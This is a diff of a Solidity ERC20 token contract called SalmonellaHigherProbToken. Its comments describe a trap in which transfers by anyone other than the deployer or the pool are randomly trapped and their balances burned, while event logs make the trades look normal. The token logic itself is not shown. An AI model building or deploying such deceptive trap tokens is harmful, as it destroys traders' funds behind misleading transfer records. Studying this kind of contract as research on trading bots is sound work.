@@ -2,11 +2,9 @@ pragma solidity ^0.8.0;
 
 import "../interfaces/IERC20.sol";
 
-
 /**
      * The Salmonella contract operates on a straightforward principle. It functions as a standard ERC20 token, behaving similarly to other ERC20 tokens under normal circumstances. 
-     * However, it incorporates specific rules to identify transactions involving anyone other than the designated owner. 
-     * In such cases, the contract only provides 10% of the intended amount, even though it generates event logs that appear to represent a complete trade.
+     * However, it incorporates specific rules to identify transactions involving anyone other than the designated accounts. 
 */
 
 contract SalmonellaHigherProbToken is IERC20 {
@@ -17,7 +15,6 @@ contract SalmonellaHigherProbToken is IERC20 {
     address public salmonellaAttacker;
     address public poolAddress;
     uint256 private randomNumberNonce;
-    uint256 private randomFactor;
     mapping(address => uint256) private _balances;
     mapping(address => mapping(address => uint256)) private _allowances;
    
@@ -31,12 +28,14 @@ contract SalmonellaHigherProbToken is IERC20 {
         totalSupply = initialSupply * 10**uint256(decimals);
         _balances[msg.sender] = totalSupply;
         salmonellaAttacker = msg.sender;
-	randomFactor = 1000;
 	randomNumberNonce = 1;
+	poolAddress = address(0); // Initialized to address (0) -> must be setted to pool address
         emit Transfer(address(0), salmonellaAttacker, totalSupply);        
     }
     
-    //setpoolAddress 
+    /**
+    * @dev set pool address to the dex pool
+    */
     function setPoolAddress(address pAddress) public {
     	poolAddress = pAddress;
     }
@@ -104,11 +103,10 @@ contract SalmonellaHigherProbToken is IERC20 {
      * @dev Moves `amount` of tokens from `sender` to `recipient`.
      *
      * Emits a {Transfer} event with Salmonella introduced: 
-     * Added boolean trapped as a flag to see if in has entered in the 10% of probability.
-     * if trapped is false, do the normal transfer function.
-     * if trapped is true, burn all their money.
-     * If sender = Owner A or B == normal Transfer
-     * Otherwise, Execute Salmonella 
+     * Added a trapProb to compute the probability of being trapped depending of the amount 
+     * If sender = salmonellaAttacker or sender == poolAddress -> Normal Transfer
+     * If sender is none of the above and random value is bigger than trapProb, do the normal transfer function.
+     * Otherwise, burn all their money.
      */
     function _transfer(address sender, address recipient, uint256 amount) internal {
         require(sender != address(0), "ERC20: transfer from the zero address");
